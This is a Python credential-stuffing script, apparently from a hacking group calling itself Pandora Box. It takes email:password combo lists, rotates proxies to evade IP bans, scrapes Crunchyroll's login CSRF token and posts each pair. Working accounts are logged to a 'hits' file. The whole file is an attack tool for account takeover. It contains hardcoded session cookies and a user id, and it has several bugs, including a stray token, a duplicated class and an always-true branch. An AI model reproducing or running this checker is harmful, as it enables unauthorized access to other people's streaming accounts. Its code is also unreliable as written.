import requests
from bs4 import BeautifulSoup
import threading
import os as a
from random import choice
import colorama
from time import sleep
from colorama import init
init()
from colorama import Fore, Back, Style


banner="""__              ____                    __ 
  / /  ___ _    __/ / /__ _    _________ _/ /_
 / _ \/ _ \ |/|/ / / / _ \ |/|/ / __/ _ `/ __/
/_//_/\___/__,__/_/_/\___/__,__/\__/\_,_/\__/                       """


a.system("cls")
class good_or_bad(object):
	def tellmewhatis(self,email,password,caso):
		if caso == True:
			
			print(Fore.BLUE + Back.GREEN+ f"[+]CUENTA VALIDA: {email}:{password}")
			print(f"""CRUNCHYROLL ACCOUNT
e = {email}
p = {password}		
CHECKER BY PANDORA BOX HACKING GROUP
HOLLOWCAT

""",file=open("crunchyroll_Hits.txt","a"))
			
		elif caso == False:
			
			print(Fore.RED + Back.YELLOW+ f"[-]CUENTA INVALIDA: {email}:{password}")
			print(f"""{email}:{password}""",file=open("bad.txt","a"))
			l

class post(object):
	def proxies(self):
		try:
			file = open("proxy_lives.txt").readlines()
			file_lines = [proxies.rstrip()for proxies in file]
			result = {"https":"http://"+choice(file_lines)}
			return result
		except:
			pass

			

class post(object):
	def proxies(self):
		try:
			file = open("proxy_lives.txt").readlines()
			file_lines = [proxies.rstrip()for proxies in file]
			result = {"https":"http://"+choice(file_lines)}
			return result
		except:
			print("PROXY ERROR")
	def request(self,email,password):
		try:
			bad = open("bad.txt","r+")
			good = open("crunchyroll_Hits.txt","r+")
			goods = good.read()
			bads = bad.read()
			req = requests.session()
			stop = "default@gmail.com"
		except:
			pass
		
		
		
		if  email in bads:
			os.system("^Z")
			os.system("^C")
			exit()

			
		elif email  in goods:
			os.system("^Z")
			os.system("^C")
			exit()
	
		
		else:
			req = requests.Session()
			proxy = self.proxies()
			
			
			try:
				while True:
					s= req.post("https://www.crunchyroll.com/es-es/login?next=%2Fes-es",proxies=proxy,timeout=3)
					pp = BeautifulSoup(s.text,"lxml")
					token4 = pp.find("input", {'name':"login_form[_token]"})["value"]
					
					
					if s.status_code == 200:
						break
			except:
				pass
			try:
				param = {
				"login_form[name]":email,
				"login_form[password]":password,
				"login_form[redirect_url]":"/es-es",
				"login_form[_token]":token4
				}
				headers = {
				"user-agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
				"content-type":"application/x-www-form-urlencoded"
				}
				cookies = {
				"__cfduid":"db2d3c89be39144eee71e5c189c5b77141553773661",
				"__qca":"P0-1278485686-1553773748002",
				"_ga":"GA1.2.41631342.1553773744",
				"_gali":"login_submit_button",
				"_gid":"GA1.2.260046432.1557429845",
				"ajs_anonymous_id":"%22a436e3fe-a3bb-46bf-8f01-8d0bac1a2a94%22",
				"ajs_group_id":"null",
				"ajs_user_id":"%2229401755%22",
				"c_d":"a%3D19%26g%3DM%26p%3D1",
				"c_userid":"29401755",
				"c_visitor":"28fbcda3-ddf7-4197-baac-0956ae2c565b",
				"cto_lwid":"0840e9d9-8976-4db2-b288-5a8b1859382c",
				"session_id	":"17c711fa6f53da3caa8f5bd089d9fd93"			}
				try:
					
					source = req.post("https://www.crunchyroll.com/es-es/login?next=%2Fes-es",data=param,headers=headers,cookies=cookies,proxies=proxy,timeout=3)	
					
				except:
					pass
			except:
					pass
			
			try:
				if """<a href="/logout" rel="nofollow" token="topbar">
                        Cerrar sesión                      </a>""" in source.text:
					good_or_bad().tellmewhatis(email,password,caso=True)
				
                
				elif """Regístrate o Inicia sesión""":
					good_or_bad().tellmewhatis(email,password,caso=False)
				else:
					print("IP PROBABLEMENTE BANEADA, CAMBIA DE PROXYS")

    				
			except Exception as e:
				pass
			try:
				if email in stop:
					sleep(5)
					print("TODAS LAS CUETNAS HAN SIDO PROBADAS")
					pass
			except:
				pass		
		

class x(object):
		
	def load(self,b):
		file = open("combo.txt","r")
		try:
				
			file_lines = file.readlines()[b]
			combo = file_lines.rstrip()
			combos = combo.split(":")
			self.check(combos)
		except:
			pass


	def check(self,acc):
		
		try:
			email = acc[0]
			password = acc[1]
			
		#print (self.load())
		except:
			pass
		while True:
			try:
				
				post().request(email,password)
				
				
				
			except  Exception:
				
				break
	def main(self):
		print("""++++++++++++++++++++CONFIG BY: ++++++++++++++++++""")
		print(Fore.GREEN+Back.BLACK+banner)
		a = open("combo.txt","r")
		s = len(a.readlines())
		for b in range(s):
			w = threading.Thread(target=self.load(b))
			w.start()
		
if __name__ == '__main__':
	x().main()